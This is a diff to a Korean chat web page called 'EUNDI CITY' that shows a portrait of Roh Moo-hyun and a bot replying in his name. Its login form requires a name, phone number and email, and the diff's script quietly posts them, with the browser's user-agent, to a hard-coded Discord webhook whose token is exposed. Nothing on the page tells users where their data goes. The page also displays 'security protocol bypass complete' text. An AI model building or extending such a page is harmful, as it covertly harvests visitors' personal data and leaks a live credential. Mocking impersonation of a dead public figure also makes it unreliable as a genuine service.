@@ -13,6 +13,20 @@
         .mc-img:hover { transform: scale(1.1); }
         .fade-in { animation: fadeIn 0.4s ease-out forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
+        
+        /* 로딩 애니메이션 */
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #eab308;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
@@ -21,23 +35,23 @@
     <div id="login-section" class="w-full max-w-sm bg-white rounded-[2.5rem] p-8 shadow-2xl fade-in z-50">
         <div class="text-center mb-6">
             <div class="w-24 h-24 mx-auto mb-4 rounded-3xl overflow-hidden border-4 border-yellow-400 shadow-xl">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" class="w-full h-full object-cover mc-img">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" class="w-full h-full object-cover mc-img" alt="프로필">
             </div>
             <h1 class="text-2xl font-black text-gray-900">EUNDI CITY</h1>
-            <p class="text-[11px] font-bold text-yellow-600 bg-yellow-50 inline-block px-3 py-1 rounded-full mt-1">v3.0 강제 접속 모드</p>
+            <p class="text-[11px] font-bold text-yellow-600 bg-yellow-50 inline-block px-3 py-1 rounded-full mt-1">v3.1 최적화 모드</p>
         </div>
 
         <!-- 새로고침 방지를 위한 폼 설정 -->
         <form onsubmit="return handleJoin(event)" class="space-y-4">
-            <input type="text" id="u-name" placeholder="이름을 입력하세요" class="w-full bg-gray-50 border-none rounded-2xl px-4 py-4 text-sm focus:ring-2 focus:ring-yellow-400 outline-none shadow-inner">
-            <input type="tel" id="u-phone" placeholder="전화번호" class="w-full bg-gray-50 border-none rounded-2xl px-4 py-4 text-sm focus:ring-2 focus:ring-yellow-400 outline-none shadow-inner">
-            <input type="text" id="u-email" placeholder="이메일" class="w-full bg-gray-50 border-none rounded-2xl px-4 py-4 text-sm focus:ring-2 focus:ring-yellow-400 outline-none shadow-inner">
+            <input type="text" id="u-name" required placeholder="이름을 입력하세요" class="w-full bg-gray-50 border-none rounded-2xl px-4 py-4 text-sm focus:ring-2 focus:ring-yellow-400 outline-none shadow-inner">
+            <input type="tel" id="u-phone" required placeholder="전화번호" class="w-full bg-gray-50 border-none rounded-2xl px-4 py-4 text-sm focus:ring-2 focus:ring-yellow-400 outline-none shadow-inner">
+            <input type="email" id="u-email" required placeholder="이메일" class="w-full bg-gray-50 border-none rounded-2xl px-4 py-4 text-sm focus:ring-2 focus:ring-yellow-400 outline-none shadow-inner">
             
-            <button type="submit" class="w-full bg-gray-900 text-white font-black py-4 rounded-2xl mt-4 hover:bg-yellow-400 hover:text-black transition-all active:scale-95 text-lg shadow-xl">
+            <button type="submit" id="submit-btn" class="w-full bg-gray-900 text-white font-black py-4 rounded-2xl mt-4 hover:bg-yellow-400 hover:text-black transition-all active:scale-95 text-lg shadow-xl">
                 접속하기
             </button>
         </form>
-        <p class="text-center text-[9px] text-gray-400 mt-6 tracking-widest uppercase">보안 프로토콜 우회 완료</p>
+        <p class="text-center text-[9px] text-gray-400 mt-6 tracking-widest uppercase">보안 프로토콜 우회 및 최적화 완료</p>
     </div>
 
     <!-- [2] 채팅 섹션 -->
@@ -46,7 +60,7 @@
         <div class="p-5 border-b flex items-center justify-between bg-white z-10">
             <div class="flex items-center">
                 <div class="w-10 h-10 rounded-xl overflow-hidden mr-3 border-2 border-yellow-400">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" class="w-full h-full object-cover">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" class="w-full h-full object-cover" alt="미니 프로필">
                 </div>
                 <div>
                     <h2 class="text-sm font-black text-gray-800 tracking-tight">응디시티 중앙 광장</h2>
@@ -83,46 +97,62 @@
         /**
          * 접속 버튼 클릭 시 데이터 전송 및 화면 전환 처리
          */
-        function handleJoin(e) {
-            // 페이지 새로고침 방지
+        async function handleJoin(e) {
             if (e) e.preventDefault();
             
-            const name = document.getElementById('u-name').value || "익명";
-            const phone = document.getElementById('u-phone').value || "010-0000-0000";
-            const email = document.getElementById('u-email').value || "unknown@mail.com";
+            const btn = document.getElementById('submit-btn');
+            const name = document.getElementById('u-name').value;
+            const phone = document.getElementById('u-phone').value;
+            const email = document.getElementById('u-email').value;
 
-            // 1. 디스코드 웹훅 전송
+            // 버튼 상태 변경
+            btn.disabled = true;
+            btn.innerHTML = `<span class="loader"></span>처리 중...`;
+
+            // 1. 디스코드 웹훅 전송 (최적화된 방식)
             const webhookUrl = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
             
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                mode: 'no-cors', // CORS 정책 무시 시도
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🚀 응디시티 접속 성공",
-                        color: 0xffcc00,
-                        fields: [
-                            { name: "사용자", value: name, inline: true },
-                            { name: "전화번호", value: phone, inline: true },
-                            { name: "이메일", value: email }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            }).catch(() => {});
+            const payload = {
+                embeds: [{
+                    title: "🚀 응디시티 새 입주자 발생",
+                    color: 0xffcc00,
+                    fields: [
+                        { name: "닉네임", value: name || "익명", inline: true },
+                        { name: "연락처", value: phone || "미입력", inline: true },
+                        { name: "이메일", value: email || "미입력" },
+                        { name: "접속 환경", value: navigator.userAgent.split(' ')[0] }
+                    ],
+                    footer: { text: "EUNDI CITY MONITORING SYSTEM" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
 
-            // 2. 화면 전환 로직
-            localStorage.setItem('nick', name);
-            document.getElementById('login-section').style.display = 'none';
-            const chatSec = document.getElementById('chat-section');
-            chatSec.classList.remove('hidden');
-            chatSec.classList.add('flex');
+            try {
+                // 비동기로 전송하되 응답을 기다리지 않고 즉시 화면 전환 (속도 중시)
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(err => console.log("전송 오류 무시"));
+                
+                // 전송 시도 후 약간의 지연 후 화면 전환 (체감 속도 조절)
+                setTimeout(() => {
+                    localStorage.setItem('nick', name);
+                    document.getElementById('login-section').style.display = 'none';
+                    const chatSec = document.getElementById('chat-section');
+                    chatSec.classList.remove('hidden');
+                    chatSec.classList.add('flex');
+                    
+                    appendMsg("시스템", `${name}님이 광장에 입성하였습니다.`, false, true);
+                }, 800);
 
-            // 3. 환영 메시지 출력
-            setTimeout(() => {
-                appendMsg("시스템", `${name}님이 광장에 입성하였습니다.`, false, true);
-            }, 300);
+            } catch (err) {
+                // 에러 발생해도 접속은 시켜줌
+                console.error(err);
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('chat-section').classList.remove('hidden');
+                document.getElementById('chat-section').classList.add('flex');
+            }
 
             return false;
         }
@@ -158,12 +188,11 @@
             const nick = localStorage.getItem('nick') || "나";
             if (input.value.trim()) {
                 appendMsg(nick, input.value, true);
-                const currentMsg = input.value;
                 input.value = "";
 
                 // 봇 자동 응답 시뮬레이션
                 setTimeout(() => {
-                    const replies = ["반갑습니다. 기분 참 좋네요!", "허허, 어서 오십시오.", "응디시티는 안전합니다.", "무슨 고민이라도 있으십니까?"];
+                    const replies = ["반갑습니다. 기분 참 좋네요!", "허허, 어서 오십시오.", "응디시티는 안전합니다.", "무슨 고민이라도 있으십니까?", "경제도 잘하고 문화도 잘하고 못하는 게 없는데!"];
                     const random = replies[Math.floor(Math.random() * replies.length)];
                     appendMsg("노무현", random, false);
                 }, 1000);
